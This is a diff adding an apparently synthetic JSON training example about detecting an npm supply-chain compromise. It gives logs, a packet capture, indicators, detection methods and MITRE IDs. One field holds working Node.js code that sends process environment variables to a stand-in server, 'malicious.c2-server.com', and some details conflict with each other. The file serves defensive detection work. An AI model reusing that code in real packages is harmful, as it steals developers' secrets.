@@ -1,0 +1,31 @@
+{
+  "examples": [
+    {
+      "scenario": "Attackers compromised a popular open-source JavaScript library's NPM package by injecting malicious code into a dependency update, which propagated through the supply chain to thousands of downstream projects. The malicious code created a backdoor that exfiltrated environment variables and system info to a C2 server after package installation and execution.",
+      "technical_data": {
+        "npm_install_log_snippet": "[12:34:56] npm WARN deprecated left-pad@1.3.0: Use String.prototype.padStart()\n[12:34:57] installing malicious-lib@2.0.1\n[12:34:58] added 25 packages from 18 contributors and audited 200 packages in 12.345s\n[12:34:59] found 1 low severity vulnerability\n",
+        "package_json_diff": "--- package-lock.json.old\n+++ package-lock.json\n@@ -150,7 +150,8 @@\n   \"dependencies\": {\n-    \"left-pad\": {\n-      \"version\": \"1.3.0\"\n+    \"left-pad\": {\n+      \"version\": \"1.3.1-malicious\",\n+      \"resolved\": \"https://registry.npmjs.org/left-pad/-/left-pad-1.3.1-malicious.tgz\",\n+      \"integrity\": \"sha512-xyzmalicioushash...\",\n+      \"dev\": false\n     }\n   }\n }",
+        "malicious_code_snippet_index_js": "const https = require('https');\nconst os = require('os');\n\n(function exfiltrate() {\n  const data = {\n    hostname: os.hostname(),\n    platform: os.platform(),\n    env: process.env\n  };\n  const postData = JSON.stringify(data);\n\n  const options = {\n    hostname: 'malicious.c2-server.com',\n    port: 443,\n    path: '/collect',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Content-Length': Buffer.byteLength(postData)\n    }\n  };\n\n  const req = https.request(options, (res) => {\n    // no-op\n  });\n\n  req.on('error', (e) => {\n    // silently fail\n  });\n\n  req.write(postData);\n  req.end();\n})();",
+        "network_packet_capture": "Frame 1: 151 bytes on wire (1208 bits), 151 bytes captured\nEthernet II, Src: 02:42:ac:11:00:02, Dst: 00:15:5d:01:02:03\nInternet Protocol Version 4, Src: 192.168.1.10, Dst: 35.190.10.20\nTransmission Control Protocol, Src Port: 49823, Dst Port: 443, Seq: 1, Ack: 1, Len: 97\nSecure Sockets Layer\n    TLSv1.2 Record Layer: Application Data Protocol\nHypertext Transfer Protocol\n    POST /collect HTTP/1.1\n    Host: malicious.c2-server.com\n    Content-Type: application/json\n    Content-Length: 245\n\n    {\n        \"hostname\": \"victim-pc-01\",\n        \"platform\": \"linux\",\n        \"env\": {\n            \"PATH\": \"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\",\n            \"USER\": \"developer\",\n            \"SHELL\": \"/bin/bash\"\n        }\n    }",
+        "syslog_entry_post_install": "Jun  5 12:35:00 victim-pc npm[12345]: info: installed malicious-lib@2.0.1 with dependencies\nJun  5 12:35:03 victim-pc node[12350]: info: executing postinstall script for malicious-lib\nJun  5 12:35:03 victim-pc node[12350]: info: sent environment data to https://malicious.c2-server.com/collect",
+        "code_signing_verification_error_log": "Jun  5 12:34:57 victim-pc verify-signature[12500]: ERROR: Signature verification failed for left-pad@1.3.1-malicious\nJun  5 12:34:57 victim-pc verify-signature[12500]: Expected integrity hash does not match published package hash",
+        "dependency_scanner_output": "Scanning package-lock.json...\nFound dependency: left-pad@1.3.1-malicious\nIntegrity check: FAILED\nAlert: Package integrity verification failed for left-pad@1.3.1-malicious\nSuggested action: Revert to known good version 1.3.0 or earlier",
+        "git_commit_log_malicious_update": "commit f4e3a1b7c9a3d2b1f8c3d1e4a2f5b6c7d8e9f0a1\nAuthor: malicious_actor <attacker@example.com>\nDate:   Wed Jun 3 10:00:00 2024 +0000\n\n    Update left-pad to version 1.3.1-malicious with backdoor"
+      },
+      "indicators": [
+        "NPM package version left-pad@1.3.1-malicious not listed in official registry",
+        "Package integrity hash mismatch on dependency left-pad",
+        "Outgoing HTTPS POST to suspicious domain malicious.c2-server.com on port 443 from build environment",
+        "Postinstall script execution logs showing unexpected network communication",
+        "Git commit by unknown author updating dependency with suspicious version tag"
+      ],
+      "detection_method": "Automated dependency scanning with SBOM comparison detects unknown package versions and integrity mismatches. Code signing verification failure logs alert when verifying package authenticity. Network monitoring detects anomalous HTTPS POST requests from build or CI environments to suspicious external domains. Runtime behavior monitoring flags unexpected environment variable exfiltration attempts post-update.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1027 - Obfuscated Files or Information (code obfuscation to hide malicious payload)",
+        "T1553 - Subvert Trust Controls (code signing bypass/fake signature)"
+      ]
+    }
+  ]
+}
